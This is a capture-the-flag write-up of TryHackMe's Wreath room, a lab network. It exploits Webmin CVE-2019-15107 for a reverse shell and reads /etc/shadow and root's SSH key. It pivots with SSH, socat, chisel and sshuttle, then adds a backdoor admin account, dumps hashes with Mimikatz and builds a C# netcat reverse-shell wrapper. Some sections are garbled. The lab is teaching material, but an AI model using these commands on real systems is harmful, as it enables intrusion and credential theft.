This room teaches how to pivot through a network by compromising a public-facing web machine and tunneling your traffic to access other machines in Wreath’s network. This was a hard-level room requiring web application security, remote code execution, port forwarding, and privilege escalation skills.

## Classic CTF Write Up

### Public web server Enumeration

#### We start off with Machine 1

Lets run a nmap scan:

```bash
sudo nmap -sC -sV -T4 -O -p-15000 -vvv 10.200.84.200
```

results:

### TASK 5 - Webserver - Enumeration

How many of the first 15000 ports are open on the target?

```
4
```

What OS does Nmap think is running?

```
centos
```

Open the IP in your browser — what site does the server try to redirect you to?

```
https://thomaswreath.thm/
```

added the IP and domain to hosts :)

Look back at your service scan results: what server version does Nmap detect as running here? (port 10000) here :p)

```
MiniServ 1.890 (Webmin httpd)
```

Upon searching the server version, we end up with:

```
https://www.exploit-db.com/exploits/47230
```

What is the CVE number for this exploit?

```
CVE-2019-15107
```

---

### TASK 6 - Webserver - Exploitation

Performing :p the commands as per task6:

```bash
pip3 install -r requirements.txt
cd CVE-2019-15107 && pip3 install -r requirements.txt
sudo apt install python3-pip
chmod +x ./CVE-2019-15107.py
./CVE-2019-15107.py 10.200.84.200
```

setting up reverse shell listener:

```bash
nc -lvnp 4242
```

getting a reverse shell:

![Reverse shell](/assets/img/wreath/img1.png)

```
cat /etc/shadow
```

notable output:

```bash
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::

```

better shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

using cat to get the contents of id_rsa from /root/.ssh/

```bash
cat /root/.ssh/id_rsa
```

and echoing to id_rsa on our attacking machine

```bash
echo 'CONTENTS OF ID_RSA' > idrsa
chmod 600 idrsa
```

:P we can finally connect with ssh: idk why straight copy pasting didn’t work:

```bash
ssh -i idrsa root@10.200.84.200
```

### TASK 9 - Pivoting - Enumeration

What is the absolute path to the file containing DNS entries on Linux?

```
/etc/resolv.conf
```

What is the absolute path to the hosts file on Windows?

```
c:\windows\system32\drivers\etc\hosts
```

How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?

```bash
for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
```

---

### TASK 10 - Pivoting - Proxychains & Foxyproxy

What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?

```bash
socks4  127.0.0.1 4242
```

What command would you use to telnet through a proxy to 172.16.0.100:23?

```bash
proxychains telnet 172.16.0.100 23
```

You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?

```
FP
```

---

### TASK 11 - Pivoting - SSH Tunneling / Port Forwarding

If you’re connecting to an SSH server _from_ your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?

```
L
```

Which switch combination can be used to background an SSH port forward or tunnel?

```
-fN
```

It’s a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

```
Nay
```

What command would you use to create a pair of throwaway SSH keys for a reverse connection?

```bash
ssh-keygen
```

If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")

`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

```bash
ssh -R 2222:172.16.0.100:22  kali@172.16.0.200 -r id_rsa -fN
```

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

`ssh -D 1337 user@172.16.0.5 -fN`

```bash
ssh -D 8000 user@target.thm
```

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is “user”, and background the shell.

```bash
ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
```

---

### TASK 12 - Pivoting - plink.exe

What tool can be used to convert OpenSSH keys into PuTTY style keys?

```
puttygen
```

---

### TASK 13 - Pivoting - Socat

Which socat option allows you to reuse the same listening port for more than one connection?

`reuseaddr` options set, to allow us to create more than one connection using this port forward.

```
reuseaddr
```

If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

Use TCP port 8000 for the server listener, and **do not** background the process.

`./socat tcp-l:8000 tcp:ATTACKING_IP:443`

```bash
./socat tcp-l:8000 tcp:172.16.0.200:443
```

What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?

`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`

```bash
./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &
```

**Bonus Question (Optional):** Try to create an encrypted port forward or relay using the `OPENSSL` options in socat. Task 7 of the [shells](https://tryhackme.com/room/introtoshells) room may help with this.

generating certificates :

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.

We then need to merge the two created files into a single `.pem` file:

```
cat shell.key shell.crt > shell.pem
```

After copying the shell.pem onto attacker machine:

### TASK 14 - Pivoting - Chisel

What command would you use to start a chisel server for a reverse connection on your attacking machine?

Use port 4242 for the listener and **do not** background the process.

```bash
./chisel server -p 4242 --reverse
```

What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?

```bash
./chisel client 172.16.0.200:4242 R:socks &
```

How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.

```bash
./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &
```

If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?

```bash
./chisel client 172.16.0.10:80 8000:172.16.0.5:4000
```

---

### TASK 15 - Pivoting - sshuttle

How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16

```bash
sshuttle -r pwned@172.16.20.7 172.16.0.0/16
```

What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?

```bash
--ssh-cmd "ssh -i priv_key"
```

You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.

What switch (and argument) could you use to fix this error?

```bash
-x 172.16.0.100
```

---

### TASK 16 - Git Server - Enumeration

sshing into MACHINE 1,
Downloading nmap static binary:

![screenshot](/assets/img/wreath/img5.png)

running nmap scan:

```bash
./nmap-Utkar5hM -sn 10.200.84.1-255 -oN scan-Utkar5hM
```

![screenshot](/assets/img/wreath/img6.png)

Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?

```

Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?

```
150
```

Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
_Looks like someone used started a smb server and a epmap instance. idk_

```

Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?

```
http

First up, let's use some basic enumeration to get to grips with the webshell:

What is the hostname for this target?

```
git-serv
```

What operating system is this target?

```
Windows
```

What user is the server running as?

```
nt authority\system
```

NOTE: To start up a TCPDump listener we would use the following command:  
`tcpdump -i tun0 icmp`

after setting up the listener,

pinging attacking machine using:

```bash
ping -n 3 10.50.85.17
```

This will send three ICMP ping packets back to you.

How many make it to the waiting listener?

```
0
```

```

URL encoding and sending the payload:

We have a reverse shell :)

NOTE: From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).

creating a new account:

```
net user utkar5hm thmp4ssw0rd /add
```

add our newly created account in the "Administrators" and "Remote Management Users" groups:  
`net localgroup Administrators USERNAME /add `net localgroup "Remote Management Users" USERNAME /add`

![screenshot](/assets/img/wreath/img19.png)

Access via evil-winrm:

```bash
evil-winrm -u utkar5hm -p thmp4ssw0rd -i 10.200.84.150
```

Loading Mimikatz:
 we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:  
`privilege::debug`
`token::elevate`

![screenshot](/assets/img/wreath/img21.png)

dumping SAM creds:

```
lsadump::sam
```

![screenshot](/assets/img/wreath/img22.png)

What is the Administrator password hash?

```
37db630168e5f82aafa8461e05c6bbd1
```

What is the NTLM password hash for the user "Thomas"?

```

```

Crackstation result for Thomas's Hash:

![screenshot](/assets/img/wreath/img23.png)

What is Thomas' password?

```
i<3ruby
```

We will use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.

To do this we use the `-H` switch *instead of* the `-p` switch we used before.

For example:  
`evil-winrm -u Administrator -H ADMIN_HASH -i IP`

### TASK 42 - AV Evasion - Enumeration

whoami /priv results:

![screenshot](/assets/img/wreath/img43.png)

**[Research]** One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?

```
SeImpersonatePrivilege
```

Let's start by looking for non-default services:  
`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`

This lists all of the services on the system, then filters so that only services that are *not* in the `C:\Windows` directory are returned. This should cut out most of the core Windows services (which are unlikely to be vulnerable to this kind of vulnerability), leaving us with primarily lesser-known, user-installed services.

What is the Name (second column from the left) of this service?

```
SystemExplorerHelpService
```

querying the service:

```
sc qc SystemExplorerHelpService
```

![screenshot](/assets/img/wreath/img44.png)

Is the service running as the local system account (Aye/Nay)?

```
Aye
```

Let's check the permissions on the directory. If we can write to it, we are golden:  
`powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`

### TASK 43 - AV Evasion - Privilege Escalation

Final C# Code:

```csharp
using System;
using System.Diagnostics;

namespace Wrapper{
	class Program{
		static void Main(){
			Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-utkar5hm.exe", "10.50.85.17 27012 -e cmd.exe");
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
	proc.Start();
		}
	}
}
```

smbshare:

```bash
sudo smbserver.py share . -smb2support -username utkar5hm -password p4ssw0rd
```

Now, in our reverse shell, we can use this command to authenticate:

```shell
net use \\10.50.85.17\share /USER:utkar5hm p4ssw0rd
```

That said, to prevent errors down the line, we should disconnect from it for the time being:

```bash
net use \\10.50.85.17\share /del
```

copying file:

```shell
copy %TEMP%\wrapper-Utkar5hM.exe "C:\Program Files (x86)\System Explorer\System.exe"
```

stopping and starting the service:

```shell
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

### TASK 44 - AV Evasion -  Exfiltration Techniques & Post Exploitation

Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?

```
Nay
```

For what reason is HTTPS preferred over HTTP during exfiltration?

```
Encryption
```

To dump the hashes locally, we first need to save the SAM hive:  
`reg.exe save HKLM\SAM sam.bak`

Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:  
`reg.exe save HKLM\SYSTEM system.bak`

copying files via SMB:

```shell
copy sam.bak \\10.50.85.17\share
copy system.bak \\10.50.85.17\share
```

getting hashes using impacket:

```
secretsdump.py -sam sam.bak -system system.bak LOCA
```
